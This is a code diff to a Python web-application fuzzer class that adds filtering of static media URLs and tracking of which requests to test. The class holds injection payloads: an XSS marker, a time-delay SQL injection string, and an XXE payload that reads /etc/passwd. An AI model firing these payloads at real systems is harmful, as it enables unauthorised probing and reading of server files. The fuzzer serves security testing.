@@ -10,6 +10,7 @@ class Fuzz:
     keepHeaders={'Upgrade-Insecure-Requests', 'User-Agent', 'Accept', 'Accept-Encoding', 'Accept-Language'}
     headers={}
     requests=[]
+    necessaryRequests={} # map requestId -> boolean to memorize if it's a required requets
     GET_params={}
     GET_hints={}
     POST_params={}
@@ -18,24 +19,38 @@ class Fuzz:
     XSS_inj='<js>'
     craftUrl='http://www.ciao.com'
 
+    ignored_extensions={'jpg', 'jpeg', 'mp3', 'mp4', 'png', 'tiff', 'bmp', 'wav', 'ogg'}
+
     def get_XSS_payload(self, paramName):
         return Fuzz.XSS_inj+str(self.reached_id)+paramName+Fuzz.XSS_inj
 
     def get_SQL_payload(self):
         return '1\'; sleep(3)'
 
+    #return whether an url of a request is required to be tested for injections
+    @staticmethod
+    def to_test(url):
+        o = urlparse(url)
+        i = len(o.path)-1
+        while i>=0:
+            if o.path[i]=='.':
+                return o.path[i+1:] not in Fuzz.ignored_extensions if i+1<len(o.path) else True
+            elif o.path[i]=='/':
+                return True
+            i-=1
+        return True
+
     # from https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
     def get_XEE_payload(self):
-        return ' <?xml version="1.0" encoding="ISO-8859-1"?>' +
-                '<!DOCTYPE foo [ ' +
-                '<!ELEMENT foo ANY >' +
-                '<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
+        return '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
 
     def put_headers(self, s, requestId):
         s.headers.update(self.headers[requestId])
         #print self.headers[requestId]
 
     def send_req(self, requestId, s, url, method, post=None):
+        if requestId not in self.necessaryRequests or self.necessaryRequests[requestId]==False:
+            return
         sleep(Fuzz.requestWaitTime)
         self.put_headers(s,requestId)
         if method=='GET':
@@ -49,6 +64,9 @@ class Fuzz:
 
         # get params
         for request in self.requests:
+            # test from url if the request is a necessary one (e.g. not static content with no or trivial backend interaction)
+            self.necessaryRequests[request['requestId']]=Fuzz.to_test(request['url'])
+            print request['url']+" "+str(self.necessaryRequests[request['requestId']])
             self.GET_params[request['requestId']]=parse_qs(urlparse(request['url']).query)
             if request['method']=='POST':
                 self.POST_params[request['requestId']]=request['requestBody']
